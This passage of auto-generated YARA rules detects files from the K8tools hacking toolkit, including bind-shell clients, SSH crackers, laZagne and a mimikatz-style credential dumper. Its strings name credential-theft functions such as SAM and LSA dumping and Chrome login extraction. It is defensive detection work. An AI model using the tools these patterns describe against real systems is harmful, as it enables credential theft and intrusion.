      $s4 = "MoudleDemo\\C#\\dll\\demo\\netscan\\obj\\Debug\\netscan.dll" fullword ascii /* score: '23.00'*/
      $s5 = "MoudleDemo\\C#\\dll\\WebBanner\\netscan\\obj\\Debug\\netscan.dll" fullword ascii /* score: '23.00'*/
      $s6 = "MoudleDemo\\C#\\dll\\demo\\netscan\\bin\\Debug\\netscan.pdb" fullword ascii /* score: '22.00'*/
      $s7 = "MoudleDemo\\C#\\dll\\WebBanner\\netscan\\bin\\Debug\\netscan.pdb" fullword ascii /* score: '22.00'*/
      $s8 = "MoudleDemo\\C#\\dll\\PortScan\\netscan\\obj\\Debug\\netscan.pdb" fullword ascii /* score: '22.00'*/
      $s9 = "MoudleDemo\\C#\\dll\\PortScan\\netscan\\obj\\Debug\\TempPE" fullword ascii /* score: '22.00'*/
      $s10 = "MoudleDemo\\C#\\dll\\PortScan\\netscan\\obj\\Debug\\netscan.csproj.FileListAbsolute.txt" fullword ascii /* score: '22.00'*/
      $s11 = "Ladon.exe" fullword ascii /* score: '22.00'*/
      $s12 = "LadonGUI.exe" fullword ascii /* score: '22.00'*/
      $s13 = "LadonExp.exe" fullword ascii /* score: '22.00'*/
      $s14 = "Ladon40.exe" fullword ascii /* score: '22.00'*/
      $s15 = "exe=F:\\Python279\\python.exe" fullword ascii /* score: '21.17'*/
      $s16 = "MoudleDemo\\Delphi\\descan.dll" fullword ascii /* score: '21.17'*/
      $s17 = "MoudleDemo\\VC\\vcscan.dll" fullword ascii /* score: '21.17'*/
      $s18 = "MoudleDemo\\C#\\exe\\demo\\bin\\Debug\\netscan.vshost.exe" fullword ascii /* score: '21.00'*/
      $s19 = "MoudleDemo\\EXE\\c#\\netscan\\bin\\Debug\\netscan.exe" fullword ascii /* score: '21.00'*/
      $s20 = "MoudleDemo\\C#\\dll\\WebBanner\\netscan\\obj\\Debug\\netscan.pdb" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 6000KB and
      8 of them
}

rule K8_MSFBindShellClient_20170524 {
   meta:
      description = "K8tools - file K8_MSFBindShellClient_20170524.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "3bd579a6feb40c5a54120e963b2126236359f4db7adfffd8cf3685a86b5ed004"
   strings:
      $s1 = "K8_MSFBindShellClient\\MSFBindShellClient.exe" fullword ascii /* score: '23.42'*/
      $s2 = "K8_MSFBindShellClient\\msf.PNG" fullword ascii /* score: '15.42'*/
      $s3 = "K8_MSFBindShellClient" fullword ascii /* score: '12.00'*/
      $s4 = "O<LF- " fullword ascii /* score: '5.42'*/
      $s5 = "@!- YkK>" fullword ascii /* score: '5.00'*/
      $s6 = "Hv- ~I" fullword ascii /* score: '5.00'*/
      $s7 = "RLSW\"_" fullword ascii /* score: '4.00'*/
      $s8 = "*pJap=-Z\"" fullword ascii /* score: '4.00'*/
      $s9 = "komJt{HuB" fullword ascii /* score: '4.00'*/
      $s10 = "PfLc~WZ" fullword ascii /* score: '4.00'*/
      $s11 = "ujhm?0" fullword ascii /* score: '4.00'*/
      $s12 = "}wZNI7rQ" fullword ascii /* score: '4.00'*/
      $s13 = "qSOze_y6#" fullword ascii /* score: '4.00'*/
      $s14 = "VHEzy%%" fullword ascii /* score: '4.00'*/
      $s15 = "FNTW!Y" fullword ascii /* score: '4.00'*/
      $s16 = "eHfd\\d0" fullword ascii /* score: '4.00'*/
      $s17 = "IYEd}Hi86" fullword ascii /* score: '4.00'*/
      $s18 = "cupif=H#" fullword ascii /* score: '4.00'*/
      $s19 = "?zjdl?" fullword ascii /* score: '4.00'*/
      $s20 = "BNZKa%S" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 900KB and
      8 of them
}

rule Dephi______demo_by_k8team_1103_K8_ {
   meta:
      description = "K8tools - file Dephi溢出demo by k8team_1103[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1974d1b11b865b8946b5ce71361aea88592e6acb92ece21bae2a7bbba6b939b8"
   strings:
      $s1 = "Dephi overflow demo by k8team\\K8overflowDemo.exe" fullword ascii /* score: '15.00'*/
      $s2 = "Dephi overflow demo by k8team\\K8clear.bat" fullword ascii /* score: '11.00'*/
      $s3 = "Dephi overflow demo by k8team\\Unit1.dfm" fullword ascii /* score: '7.00'*/
      $s4 = "Dephi overflow demo by k8team\\K8overflowDemo.dpr" fullword ascii /* score: '7.00'*/
      $s5 = "Dephi overflow demo by k8team\\Unit1.pas" fullword ascii /* score: '7.00'*/
      $s6 = "Dephi overflow demo by k8team\\K8overflowDemo.res" fullword ascii /* score: '7.00'*/
      $s7 = "gk\"VXgFJ=60" fullword ascii /* score: '4.42'*/
      $s8 = "Dephi overflow demo by k8team" fullword ascii /* score: '4.00'*/
      $s9 = "3coM>m" fullword ascii /* score: '4.00'*/
      $s10 = "{dMAk_A\"" fullword ascii /* score: '4.00'*/
      $s11 = "UDgk!@fS[F" fullword ascii /* score: '4.00'*/
      $s12 = "LLTT\\[F" fullword ascii /* score: '4.00'*/
      $s13 = "ZLAwOp@" fullword ascii /* score: '4.00'*/
      $s14 = "hlXj*\\" fullword ascii /* score: '4.00'*/
      $s15 = "KKow\\w" fullword ascii /* score: '4.00'*/
      $s16 = "jepzf}m" fullword ascii /* score: '4.00'*/
      $s17 = "NbuzEXV" fullword ascii /* score: '4.00'*/
      $s18 = "SnXXYzKQhY" fullword ascii /* score: '4.00'*/
      $s19 = "CwNrF{\"" fullword ascii /* score: '4.00'*/
      $s20 = "\\z?`veH" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 500KB and
      8 of them
}

rule ___net_______K8 {
   meta:
      description = "K8tools - file 无net提权_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "71cf652e178709a06c02947a2a9f367652bd81bb6206f91d36bdad92da2a15d8"
   strings:
      $s1 = "net1.exe" fullword ascii /* score: '19.00'*/
      $s2 = "_K8\\NotNetAddUser.exe" fullword ascii /* score: '18.42'*/
      $s3 = "_K8.txt" fullword ascii /* score: '8.00'*/
      $s4 = "fpGlV t" fullword ascii /* score: '4.00'*/
      $s5 = "ivABk!'Ut" fullword ascii /* score: '4.00'*/
      $s6 = "BszM9Hj%wm<^" fullword ascii /* score: '4.00'*/
      $s7 = "\\lvYp%" fullword ascii /* score: '2.00'*/
      $s8 = "2009  " fullword ascii /* score: '1.17'*/
      $s9 = "by K8" fullword ascii /* score: '1.00'*/
      $s10 = "\"N;-a e" fullword ascii /* score: '1.00'*/
      $s11 = "2013-01-18Q-t" fullword ascii /* score: '1.00'*/
      $s12 = ",RvM>!" fullword ascii /* score: '1.00'*/
      $s13 = "E/30V`" fullword ascii /* score: '1.00'*/
      $s14 = "#6P:(kF" fullword ascii /* score: '1.00'*/
      $s15 = "fzoIgk" fullword ascii /* score: '1.00'*/
      $s16 = "S16#n2" fullword ascii /* score: '1.00'*/
      $s17 = "`ejs\"0" fullword ascii /* score: '1.00'*/
      $s18 = "%a^b'^" fullword ascii /* score: '1.00'*/
      $s19 = "i0_Pl)" fullword ascii /* score: '1.00'*/
      $s20 = "qSX!1A" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 90KB and
      8 of them
}

rule K8_FuckOneShell_20161224_5BK_8_5D {
   meta:
      description = "K8tools - file K8_FuckOneShell_20161224%5BK.8%5D.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "3bd1c6bb323f1188289fa9e01b7ab580fb309d93875dec88452b1a3eae98b44d"
   strings:
      $s1 = "K8_FuckOneShell\\K8_FuckOneShell.exe" fullword ascii /* score: '20.42'*/
      $s2 = "K8_FuckOneShell\\pass.txt" fullword ascii /* score: '19.00'*/
      $s3 = "K8_FuckOneShell\\IMG\\IIS6_aspx2.PNG" fullword ascii /* score: '12.17'*/
      $s4 = "K8_FuckOneShell\\IMG\\3000.PNG" fullword ascii /* score: '12.17'*/
      $s5 = "K8_FuckOneShell\\IMG\\Tocmat JSP.PNG" fullword ascii /* score: '12.17'*/
      $s6 = "K8_FuckOneShell\\IMG\\" fullword ascii /* score: '9.42'*/
      $s7 = "K8_FuckOneShell\\IMG" fullword ascii /* score: '9.42'*/
      $s8 = "K8_FuckOneShell\\IMG\\10" fullword ascii /* score: '9.00'*/
      $s9 = "* .'3r" fullword ascii /* score: '9.00'*/
      $s10 = "K8_FuckOneShell" fullword ascii /* score: '9.00'*/
      $s11 = "Kqf:\"r" fullword ascii /* score: '7.00'*/
      $s12 = "?v:\\Ew" fullword ascii /* score: '7.00'*/
      $s13 = "- (CtZ_p(" fullword ascii /* score: '5.00'*/
      $s14 = "# 5BK`" fullword ascii /* score: '5.00'*/
      $s15 = "tocmat" fullword ascii /* score: '5.00'*/
      $s16 = "h<L -@" fullword ascii /* score: '5.00'*/
      $s17 = "i(.)u|BLTF!s " fullword ascii /* score: '4.42'*/
      $s18 = "aJSJo$bN\"id" fullword ascii /* score: '4.03'*/
      $s19 = "gPgc& V" fullword ascii /* score: '4.00'*/
      $s20 = "5igMge#8^8" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _sshtest_sshshell_0 {
   meta:
      description = "K8tools - from files sshtest.exe, sshshell.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d7d61aa444474253820c7edac264f911d8242a0998c87bd28c24a21f217703fa"
      hash2 = "fbbbc1241847314b0dd44d0b00d249337bad34288bf1ea763b844c383fa1ee26"
   strings:
      $x1 = "ssh: unmarshal error for field %s of type %s%sstopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark " ascii /* score: '54.00'*/
      $x2 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=" ascii /* score: '49.00'*/
      $x3 = "152587890625762939453125Bidi_ControlGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibr" ascii /* score: '44.00'*/
      $x4 = "of unexported method previous allocCount=186264514923095703125931322574615478515625AdjustTokenPrivilegesAlaskan Standard TimeAna" ascii /* score: '38.00'*/
      $x5 = "to unallocated span%%!%c(*big.Float=%s)37252902984619140625: leftover defer sp=Arabic Standard TimeAzores Standard TimeCertOpenS" ascii /* score: '35.00'*/
      $x6 = "invalid network interface nameinvalid pointer found on stacknode is not its parent's childnotetsleep - waitm out of syncprotocol" ascii /* score: '34.50'*/
      $x7 = "structure needs cleaningunknown channel type: %v bytes failed with errno= to unused region of span2910383045673370361328125AUS C" ascii /* score: '33.00'*/
      $x8 = "bad flushGen bad map statechannelEOFMsgdisconnectMsgempty integerexchange fullfatal error: gethostbynamegetservbynamehmac-sha2-2" ascii /* score: '33.00'*/
      $x9 = "mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivecontext.TODOdumping heap" ascii /* score: '32.00'*/
      $x10 = "MB) workers= called from  flushedWork  gcscanvalid  heap_marked= idlethreads= is nil, not  nStackRoots= s.spanclass= span.base()" ascii /* score: '32.00'*/
      $x11 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '31.00'*/
      $s12 = "(%s)CreateFileMappingWCuba Standard TimeFiji Standard TimeGetComputerNameExWGetExitCodeProcessGetFileAttributesWGetModuleFileNam" ascii /* score: '28.00'*/
      $s13 = "entersyscallgcpacertracegetaddrinfowhmac-sha1-96host is downillegal seekinvalid baseinvalid portinvalid slotiphlpapi.dllkernel32" ascii /* score: '28.00'*/
      $s14 = "ValueWRegOpenKeyExWRoundingMode(VirtualUnlockWriteConsoleWadvapi32.dll" fullword ascii /* score: '28.00'*/
      $s15 = "mstartbad value for fielddevice not a streamdirectory not emptydisk quota exceededecdsa-sha2-nistp256ecdsa-sha2-nistp384ecdsa-sh" ascii /* score: '27.00'*/
      $s16 = "t) - deadlock!reflect.FuncOf does not support more than 50 argumentsruntime: GetQueuedCompletionStatus returned op == nil" fullword ascii /* score: '26.00'*/
      $s17 = "(%s)CreateFileMappingWCuba Standard TimeFiji Standard TimeGetComputerNameExWGetExitCodeProcessGetFileAttributesWGetModuleFileNam" ascii /* score: '26.00'*/
      $s18 = "ssh: unexpected packet in response to channel open: %Tx509: cannot verify signature: algorithm unimplementedSOFTWARE\\Microsoft" ascii /* score: '26.00'*/
      $s19 = "q*struct { lock runtime.mutex; newm runtime.muintptr; waiting bool; wake runtime.note; haveTemplateThread uint32 }" fullword ascii /* score: '25.00'*/
      $s20 = "CertEnumCertificatesInStoreEaster Island Standard TimeG waiting list is corruptedaddress not a stack addressadministratively pro" ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "1c2a6fbef41572f4c9ce8acb5a63cde7" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_sshcmd_1 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "btcl85.dll" fullword ascii /* score: '23.00'*/
      $s2 = "btk85.dll" fullword ascii /* score: '20.00'*/
      $s3 = "future.backports.http.cookiejar(" fullword ascii /* score: '16.00'*/
      $s4 = "future.backports.email._encoded_words(" fullword ascii /* score: '15.42'*/
      $s5 = "future.backports.email.header(" fullword ascii /* score: '15.00'*/
      $s6 = "future.backports.datetime(" fullword ascii /* score: '14.00'*/
      $s7 = "CdCdCdCdCdCdCdCdCdCdCdCdCdCd" ascii /* base64 encoded string 't'Bt'Bt'Bt'Bt'Bt'Bt'' */ /* score: '14.00'*/
      $s8 = "FPPPPP" fullword ascii /* reversed goodware string 'PPPPPF' */ /* score: '13.50'*/
      $s9 = "future.backports.http.client(" fullword ascii /* score: '13.00'*/
      $s10 = "future.backports.urllib.error(" fullword ascii /* score: '13.00'*/
      $s11 = "future.backports.http(" fullword ascii /* score: '13.00'*/
      $s12 = "future.backports.email.errors(" fullword ascii /* score: '13.00'*/
      $s13 = "xtk\\dialog.tcl" fullword ascii /* score: '12.42'*/
      $s14 = "xtk\\images\\logoLarge.gif" fullword ascii /* score: '12.17'*/
      $s15 = "xtk\\images\\logo64.gif" fullword ascii /* score: '12.17'*/
      $s16 = "xtk\\images\\pwrdLogo200.gif" fullword ascii /* score: '12.17'*/
      $s17 = "xtk\\images\\pwrdLogo150.gif" fullword ascii /* score: '12.17'*/
      $s18 = "xtk\\images\\pwrdLogo175.gif" fullword ascii /* score: '12.17'*/
      $s19 = "xtk\\images\\logo.eps" fullword ascii /* score: '12.17'*/
      $s20 = "xtk\\images\\pwrdLogo75.gif" fullword ascii /* score: '12.17'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_web_K8PortScan_sshcmd_smbcheck_2 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, web.exe, K8PortScan.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash5 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash6 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "kWkwkOkok" fullword ascii /* base64 encoded string 'ZL$:J$' */ /* score: '14.00'*/
      $s2 = "7\\0\\4|f" fullword ascii /* score: '9.00'*/ /* hex encoded string 'pO' */
      $s3 = "vvvvqvuvs" fullword ascii /* score: '8.00'*/
      $s4 = "gwdwfwe" fullword ascii /* score: '8.00'*/
      $s5 = "swpwrwq" fullword ascii /* score: '8.00'*/
      $s6 = "hioihid" fullword ascii /* score: '8.00'*/
      $s7 = "fphpxpt" fullword ascii /* score: '8.00'*/
      $s8 = "tqtutstw" fullword ascii /* score: '8.00'*/
      $s9 = "tydwdod" fullword ascii /* score: '8.00'*/
      $s10 = "glkueaq" fullword ascii /* score: '8.00'*/
      $s11 = "llnhnlnjni" fullword ascii /* score: '8.00'*/
      $s12 = "liiimio" fullword ascii /* score: '8.00'*/
      $s13 = "MUESWFSWDS" fullword ascii /* score: '6.50'*/
      $s14 = "KOHOJOIOK" fullword ascii /* score: '6.50'*/
      $s15 = "ROQOROS" fullword ascii /* score: '6.50'*/
      $s16 = "JXDXBXL" fullword ascii /* score: '6.50'*/
      $s17 = "WWPWRWZ" fullword ascii /* score: '6.50'*/
      $s18 = "OZKZGZO" fullword ascii /* score: '6.50'*/
      $s19 = "rAT>EY" fullword ascii /* score: '6.00'*/
      $s20 = "nT.P0C&" fullword ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _sshcrack_sshcmd_3 {
   meta:
      description = "K8tools - from files sshcrack.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash2 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "b_win32sysloader.pyd" fullword ascii /* score: '16.00'*/
      $s2 = "paramiko.hostkeys(" fullword ascii /* score: '15.00'*/
      $s3 = "cryptography.hazmat.primitives.kdf.scrypt(" fullword ascii /* score: '14.00'*/
      $s4 = "paramiko.compress(" fullword ascii /* score: '14.00'*/
      $s5 = "paramiko.common(" fullword ascii /* score: '14.00'*/
      $s6 = "bcryptography.hazmat.bindings._openssl.pyd" fullword ascii /* score: '13.00'*/
      $s7 = "bcryptography.hazmat.bindings._constant_time.pyd" fullword ascii /* score: '13.00'*/
      $s8 = "nacl.bindings.crypto_hash(" fullword ascii /* score: '13.00'*/
      $s9 = "nacl.bindings.crypto_pwhash(" fullword ascii /* score: '13.00'*/
      $s10 = "nacl.bindings.crypto_generichash(" fullword ascii /* score: '13.00'*/
      $s11 = "nacl.bindings.crypto_shorthash(" fullword ascii /* score: '13.00'*/
      $s12 = "paramiko.buffered_pipe(" fullword ascii /* score: '13.00'*/
      $s13 = "paramiko.pipe(" fullword ascii /* score: '13.00'*/
      $s14 = "xcryptography-2.2.2-py2.7.egg-info\\DESCRIPTION.rst" fullword ascii /* score: '13.00'*/
      $s15 = "paramiko.sftp_server(" fullword ascii /* score: '12.00'*/
      $s16 = "paramiko.sftp_attr(" fullword ascii /* score: '12.00'*/
      $s17 = "paramiko.sftp_client(" fullword ascii /* score: '12.00'*/
      $s18 = "paramiko.agent(" fullword ascii /* score: '12.00'*/
      $s19 = "paramiko.sftp_file(" fullword ascii /* score: '12.00'*/
      $s20 = "paramiko.sftp_si(" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" and ( 8 of them )
      ) or ( all of them )
}

rule _mz64_mz_4 {
   meta:
      description = "K8tools - from files mz64.exe, mz.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b294f94c469f43a78a324b5cfecbde0afb3aa0256bbde06ca2718b8c038a9324"
      hash2 = "ca53a44687045e8412586bbc9ff54e834c629187c11810608c8dfdc7503d55b6"
   strings:
      $x1 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide /* score: '46.00'*/
      $x2 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kull_m_registry_RegOpenKeyEx LSA KO" fullword wide /* score: '37.00'*/
      $x3 = "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" fullword wide /* score: '37.00'*/
      $x4 = "ERROR kuhl_m_lsadump_trust ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x5 = "ERROR kuhl_m_lsadump_lsa ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x6 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_lsadump_getSamKey KO" fullword wide /* score: '37.00'*/
      $x7 = "ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x%08x)" fullword wide /* score: '37.00'*/
      $x8 = "ERROR kuhl_m_lsadump_netsync ; I_NetServerTrustPasswordsGet (0x%08x)" fullword wide /* score: '34.00'*/
      $x9 = "ERROR kuhl_m_dpapi_chrome ; Input 'Login Data' file needed (/in:\"%%localappdata%%\\Google\\Chrome\\User Data\\Default\\Login Da" wide /* score: '34.00'*/
      $x10 = "ERROR kuhl_m_kernel_processProtect ; Argument /process:program.exe or /pid:processid needed" fullword wide /* score: '34.00'*/
      $x11 = "ERROR kuhl_m_lsadump_sam ; kull_m_registry_RegOpenKeyEx (SAM) (0x%08x)" fullword wide /* score: '33.00'*/
      $x12 = "ERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (%hu)" fullword wide /* score: '33.00'*/
      $x13 = "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:0x%08x - R:0x%08x)" fullword wide /* score: '33.00'*/
      $x14 = "ERROR kuhl_m_lsadump_changentlm ; Argument /oldpassword: or /oldntlm: is needed" fullword wide /* score: '33.00'*/
      $x15 = "livessp.dll" fullword wide /* reversed goodware string 'lld.pssevil' */ /* score: '33.00'*/
      $x16 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide /* score: '32.00'*/
      $x17 = "ERROR kuhl_m_lsadump_getKeyFromGUID ; kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x" fullword wide /* score: '32.00'*/
      $x18 = "!!! parts after public exponent are process encrypted !!!" fullword wide /* score: '32.00'*/
      $x19 = "ERROR kuhl_m_lsadump_getSamKey ; RtlEncryptDecryptRC4 KO" fullword wide /* score: '31.00'*/
      $x20 = "ERROR kuhl_m_lsadump_getHash ; RtlEncryptDecryptRC4" fullword wide /* score: '31.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _K8weblogic_K8weblogic_5 {
   meta:
      description = "K8tools - from files K8weblogic.exe, K8weblogic.jar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "520c7663266cf2016f83bd14d096cf4d3ee2c1ef0a6a1c136f2ae3c7281e920e"
      hash2 = "d1d96275c5e8c452e73ec5c91912a5cd7488e5df08e70e87e5b7df4e5e43b684"
   strings:
      $s1 = "demo/WebLogicPasswordDecryptor.class" fullword ascii /* score: '15.00'*/
      $s2 = "demo/WebLogicPasswordDecryptor.classPK" fullword ascii /* score: '15.00'*/
      $s3 = "org/eclipse/jdt/internal/jarinjarloader/PK" fullword ascii /* score: '13.00'*/
      $s4 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.classPK" fullword ascii /* score: '12.00'*/
      $s5 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.class" fullword ascii /* score: '12.00'*/
      $s6 = "AbsoluteLayout.jar" fullword ascii /* score: '10.00'*/
      $s7 = "E /c 8/[" fullword ascii /* score: '9.00'*/
      $s8 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader$ManifestInfo.classPK" fullword ascii /* score: '9.00'*/
      $s9 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandler.classPK" fullword ascii /* score: '9.00'*/
      $s10 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandlerFactory.classPK" fullword ascii /* score: '9.00'*/
      $s11 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader.classPK" fullword ascii /* score: '9.00'*/
      $s12 = "org/eclipse/jdt/internal/jarinjarloader/JIJConstants.classPK" fullword ascii /* score: '9.00'*/
      $s13 = "org/eclipse/jdt/internal/jarinjarloader/JIJConstants.class" fullword ascii /* score: '9.00'*/
      $s14 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader.class" fullword ascii /* score: '9.00'*/
      $s15 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandler.class" fullword ascii /* score: '9.00'*/
      $s16 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLStreamHandlerFactory.class" fullword ascii /* score: '9.00'*/
      $s17 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader$ManifestInfo.class" fullword ascii /* score: '9.00'*/
      $s18 = "swing-layout-1.0.3.jar" fullword ascii /* score: '7.00'*/
      $s19 = "META-INF/BCKEY.SF" fullword ascii /* score: '7.00'*/
      $s20 = "o^mQ:\"@" fullword ascii /* score: '7.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 5000KB and pe.imphash() == "ce878847f35f6607b0dec6150c64f165" and ( 8 of them )
      ) or ( all of them )
}

rule _ScRunBase32_ScRunBase64_scrun_6 {
   meta:
      description = "K8tools - from files ScRunBase32.exe, ScRunBase64.exe, scrun.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash2 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash3 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
   strings:
      $s1 = "Kr5UqBm ^bD:\\" fullword ascii /* score: '10.00'*/
      $s2 = "#3\\[5{~~" fullword ascii /* score: '9.00'*/ /* hex encoded string '5' */
      $s3 = "ibvevcvg" fullword ascii /* score: '8.00'*/
      $s4 = "skpkrkqks" fullword ascii /* score: '8.00'*/
      $s5 = "pMq:\\H\\" fullword ascii /* score: '7.00'*/
      $s6 = "8xS:\\I" fullword ascii /* score: '7.00'*/
      $s7 = "o5M:\"q" fullword ascii /* score: '7.00'*/
      $s8 = "}wEYeG5" fullword ascii /* score: '6.00'*/
      $s9 = "6h;g^rat" fullword ascii /* score: '6.00'*/
      $s10 = "- !x@=" fullword ascii /* score: '5.00'*/
      $s11 = "yytkxu" fullword ascii /* score: '5.00'*/
      $s12 = "YQgLlm0" fullword ascii /* score: '5.00'*/
      $s13 = "THJxfP3" fullword ascii /* score: '5.00'*/
      $s14 = "RpomAP9" fullword ascii /* score: '5.00'*/
      $s15 = "d[+ ,s" fullword ascii /* score: '5.00'*/
      $s16 = "M%+B%q%" fullword ascii /* score: '5.00'*/
      $s17 = "WYCYdS7" fullword ascii /* score: '5.00'*/
      $s18 = "UVLY)t " fullword ascii /* score: '4.42'*/
      $s19 = "ZZEZ]q " fullword ascii /* score: '4.42'*/
      $s20 = "O wkvIZ#+" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_ScRunBase32_sshcrack_web_K8PortScan_ScRunBase64_scrun_sshcmd_smbcheck_7 {
   meta:
      description = "K8tools - from files laZagne.exe, ScRunBase32.exe, sshcrack.exe, web.exe, K8PortScan.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash3 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash4 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash5 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash6 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash7 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash8 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash9 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
